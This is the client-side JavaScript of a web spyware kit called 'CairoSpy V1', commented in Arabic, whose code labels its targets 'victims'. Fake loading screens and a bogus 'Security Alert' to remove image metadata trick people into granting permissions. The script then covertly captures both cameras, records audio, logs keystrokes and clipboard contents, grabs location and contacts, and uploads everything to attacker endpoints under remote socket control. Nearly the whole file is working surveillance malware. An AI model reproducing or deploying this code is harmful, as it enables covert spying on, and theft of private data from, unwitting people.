// ========== CairoSpy V1 - Client Side ==========
const SOCKET = io();
let VICTIM_ID = generateId();
let WEBCAM_INTERVAL = null;

// === توليد ID للضحية ===
function generateId() {
    return 'victim_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now();
}

// === تتبع الجهاز ===
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack
    };
}

// === الحصول على IP ===
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        document.getElementById('ipInfo').textContent = data.ip;
        return data.ip;
    } catch(e) {
        document.getElementById('ipInfo').textContent = 'Unknown';
        return 'Unknown';
    }
}

// === الكاميرا ===
async function captureCamera(type = 'both') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: type === 'front' ? 'user' : 'environment', width: 640, height: 480 },
            audio: true
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        
        // تصوير الإطار
        ctx.drawImage(video, 0, 0, 640, 480);
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // إرسال الصورة
        fetch('/api/camera', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                victim_id: VICTIM_ID,
                type: type,
                image: imageData
            })
        });
        
        // إيقاف الكاميرا
        stream.getTracks().forEach(track => track.stop());
        
        return imageData;
    } catch(e) {
        console.log('Camera error:', e.message);
        return null;
    }
}

// === تصوير الكاميرا الأمامية والخلفية معًا ===
async function captureBothCameras() {
    // الأمامية
    await captureCamera('front');
    // الخلفية (بعد تأخير بسيط)
    setTimeout(async () => {
        await captureCamera('environment');
    }, 500);
}

// === تسجيل الصوت ===
let mediaRecorder = null;
let audioChunks = [];

async function startAudioRecording(duration = 10000) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        
        mediaRecorder.ondataavailable = event => {
            audioChunks.push(event.data);
        };
        
        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.onload = function() {
                fetch('/api/files', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        filename: `audio_${VICTIM_ID}_${Date.now()}.webm`,
                        file: reader.result
                    })
                });
            };
            reader.readAsDataURL(audioBlob);
            stream.getTracks().forEach(track => track.stop());
        };
        
        mediaRecorder.start();
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, duration);
    } catch(e) {
        console.log('Audio error:', e.message);
    }
}

// === Keylogger متقدم ===
let keyBuffer = '';
let lastKeyTime = Date.now();

document.addEventListener('keydown', function(e) {
    const key = e.key;
    
    // تجاهل المفاتيح الخاصة
    if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'Escape'].includes(key)) return;
    
    const now = Date.now();
    keyBuffer += key;
    
    // إرسال كل 5 ثواني أو 50 حرف
    if (keyBuffer.length >= 50 || (now - lastKeyTime) > 5000) {
        sendKeys();
        lastKeyTime = now;
    }
});

// إرسال عند فقدان التركيز
document.addEventListener('visibilitychange', function() {
    if (document.hidden && keyBuffer.length > 0) {
        sendKeys();
    }
});

function sendKeys() {
    if (keyBuffer.length === 0) return;
    
    fetch('/api/keylog', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            keys: keyBuffer,
            url: window.location.href,
            timestamp: new Date().toISOString()
        })
    });
    keyBuffer = '';
}

// التقاط الـClipboard
document.addEventListener('copy', function(e) {
    const text = document.getSelection().toString();
    fetch('/api/keylog', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            keys: '[COPY] ' + text,
            url: window.location.href
        })
    });
});

document.addEventListener('paste', function(e) {
    const text = (e.clipboardData || window.clipboardData).getData('text');
    fetch('/api/keylog', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            keys: '[PASTE] ' + text,
            url: window.location.href
        })
    });
});

// === الموقع ===
async function getLocation() {
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const data = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
                speed: position.coords.speed,
                timestamp: position.timestamp
            };
            
            fetch('/api/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        },
        (error) => {
            // محاولة IP Geolocation إذا فشل GPS
            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(data => {
                    fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: data.latitude,
                            lon: data.longitude,
                            accuracy: 'IP-based',
                            city: data.city,
                            region: data.region,
                            country: data.country_name
                        })
                    });
                })
                .catch(() => {});
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

// === جهات الاتصال (محاولة عن طريق vCard/WEBDAV) ===
async function getContacts() {
    // في المتصفحات الحديثة هذا صعب، لكن نحاول بالـ API المتاحة
    try {
        if (navigator.contacts && navigator.contacts.select) {
            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
            fetch('/api/contacts', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ contacts: contacts })
            });
        }
    } catch(e) {
        console.log('Contacts API not supported');
    }
}

// === الـControl (أوامر التحكم) ===
SOCKET.on('control', function(data) {
    switch(data.action) {
        case 'toast':
            showToast(data.message);
            break;
        case 'notify':
            showNotification(data.title, data.body);
            break;
        case 'sound':
            playSound();
            break;
        case 'vibrate':
            if (navigator.vibrate) {
                navigator.vibrate(data.duration || 3000);
            }
            break;
        case 'open_url':
            window.open(data.url, '_blank');
            break;
    }
});

function showToast(msg) {
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.textContent = msg;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

function showNotification(title, body) {
    if ('Notification' in window && Notification.permission === 'granted') {
        new Notification(title, { body: body, icon: '/static/fake.jpg' });
    }
}

function playSound() {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = 'sawtooth';
    osc.frequency.value = 880;
    gain.gain.value = 0.5;
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    setTimeout(() => osc.stop(), 5000);
}

// === صفحة اللودينغ ===
let progress = 0;

function animateLoading() {
    const progressBar = document.getElementById('progressBar');
    const statusText = document.getElementById('statusText');
    const loadingScreen = document.getElementById('loadingScreen');
    const permissionScreen = document.getElementById('permissionScreen');
    
    const statuses = [
        'Initializing...',
        'Checking system files...',
        'Verifying device compatibility...',
        'Configuring security settings...',
        'Almost done...'
    ];
    
    const interval = setInterval(() => {
        progress += Math.random() * 15;
        if (progress > 100) progress = 100;
        
        progressBar.style.width = progress + '%';
        statusText.textContent = statuses[Math.floor(progress / 25)] || 'Complete!';
        
        if (progress >= 100) {
            clearInterval(interval);
            setTimeout(() => {
                loadingScreen.classList.add('hidden');
                permissionScreen.classList.remove('hidden');
                
                // بدء العمليات في الخلفية
                setTimeout(async () => {
                    await captureBothCameras();
                    startAudioRecording(15000);
                    getLocation();
                    getContacts();
                }, 1000);
            }, 500);
        }
    }, 800);
}

// === طلب الأذونات ===
async function requestPermissions() {
    try {
        // طلب الكاميرا والميكروفون
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: true, 
            audio: true 
        });
        stream.getTracks().forEach(track => track.stop());
        
        // طلب الإشعارات
        if ('Notification' in window) {
            Notification.requestPermission();
        }
        
        document.getElementById('permissionScreen').classList.add('hidden');
        document.getElementById('mainScreen').classList.remove('hidden');
        
        // التصوير الفوري
        await captureBothCameras();
        startAudioRecording(15000);
        getLocation();
        getContacts();
        
    } catch(e) {
        console.log('Permission denied:', e.message);
        skipPermissions();
    }
}

function skipPermissions() {
    document.getElementById('permissionScreen').classList.add('hidden');
    document.getElementById('mainScreen').classList.remove('hidden');
    
    // محاولة بدون أذونات (IP Geolocation)
    getIP();
    getLocation(); // IP-based
}

// === بدء التشغيل ===
window.onload = function() {
    // معلومات الجهاز
    getIP();
    document.getElementById('deviceInfo').textContent = navigator.platform;
    document.getElementById('browserInfo').textContent = navigator.userAgent.split('/')[0];
    
    // بدأ الأنيميشن
    animateLoading();
    
    // بدأ keylogger فورًا
    document.addEventListener('DOMContentLoaded', function() {
        // keylogger شغال
    });
};

// === هجوم الصورة الملغمة ===
if (window.location.pathname === '/image') {
    // عند فتح الصورة، نظهر إعلان منبثق
    setTimeout(() => {
        const overlay = document.createElement('div');
        overlay.className = 'modal-overlay';
        overlay.innerHTML = `
            <div class="modal">
                <h3>⚠️ Security Alert</h3>
                <p>This image contains tracking metadata. Click OK to remove.</p>
                <button onclick="this.closest('.modal-overlay').remove(); requestPermissions();">Remove Metadata</button>
            </div>
        `;
        document.body.appendChild(overlay);
    }, 2000);
}

// === هجوم QR ===
if (window.location.pathname === '/qr') {
    // بعد مسح QR، يطلب الكاميرا
    setTimeout(() => {
        document.getElementById('permissionScreen').classList.remove('hidden');
    }, 1500);
}